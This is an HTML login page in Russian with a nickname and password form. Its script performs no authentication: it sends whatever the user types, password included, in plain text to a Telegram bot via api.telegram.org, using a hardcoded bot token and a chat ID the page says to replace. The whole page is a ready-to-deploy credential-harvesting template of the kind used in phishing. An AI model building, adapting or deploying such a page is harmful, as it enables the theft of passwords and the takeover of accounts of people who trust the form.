<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход на сайт</title>
    <style>
        /* Простые стили для красоты */
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,0,0,0.2);
            width: 300px;
        }
        h2 {
            text-align: center;
            color: #333;
            margin-bottom: 30px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 8px 0 20px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
            font-size: 14px;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s;
        }
        button:hover {
            background: #5a67d8;
        }
        #message {
            text-align: center;
            margin-top: 15px;
            color: #666;
            font-size: 14px;
        }
        .error {
            color: #e53e3e;
            text-align: center;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Вход на сайт</h2>
        <!-- Форма ввода -->
        <form id="loginForm">
            <label for="username">Никнейм:</label>
            <input type="text" id="username" name="username" required placeholder="Введите ваш ник">
            
            <label for="password">Пароль:</label>
            <input type="password" id="password" name="password" required placeholder="Введите пароль">
            
            <button type="submit">Войти</button>
        </form>
        <div id="message"></div>
    </div>

    <script>
        // НАСТРОЙКИ TELEGRAM (ЗАМЕНИТЕ НА СВОИ!)
        const TELEGRAM_BOT_TOKEN = '7043524346:AAFY2BwMxrFp8v0LzH-JC9uRqe3l8yZ0'; // Пример: 7234567890:AAHdqTcvH1hC...
        const TELEGRAM_CHAT_ID = '123456789'; // Пример: 123456789

        // Функция отправки данных в Telegram
        async function sendToTelegram(username, password) {
            // Формируем сообщение. Символы %0A - это перенос строки
            const message = `🔔 Новая попытка входа!%0A👤 Ник: ${username}%0A🔑 Пароль: ${password}`;
            
            // URL для отправки сообщения через бота
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${message}`;

            try {
                // Отправляем запрос к API Telegram
                const response = await fetch(url);
                const data = await response.json();
                
                if (data.ok) {
                    return { success: true, message: 'Данные отправлены!' };
                } else {
                    return { success: false, message: 'Ошибка отправки в Telegram' };
                }
            } catch (error) {
                console.error('Ошибка:', error);
                return { success: false, message: 'Не удалось отправить данные' };
            }
        }

        // Обработчик отправки формы
        document.getElementById('loginForm').addEventListener('submit', async function(event) {
            event.preventDefault(); // Отменяем стандартную отправку формы (чтобы страница не перезагружалась)
            
            // Получаем значения из полей ввода
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // Простейшая проверка (чтобы не отправлять пустые строки)
            if (!username || !password) {
                document.getElementById('message').innerHTML = '<span class="error">Заполните все поля!</span>';
                return;
            }

            // Показываем сообщение о процессе отправки
            document.getElementById('message').innerText = 'Отправка...';
            
            // Отправляем данные в Telegram
            const result = await sendToTelegram(username, password);
            
            // Показываем результат пользователю
            if (result.success) {
                document.getElementById('message').innerHTML = '<span style="color: #38a169;">✓ Данные отправлены владельцу!</span>';
                // Очищаем форму после успеха (опционально)
                // document.getElementById('loginForm').reset();
            } else {
                document.getElementById('message').innerHTML = `<span class="error">✗ ${result.message}</span>`;
            }
        });
    </script>
</body>
</html>
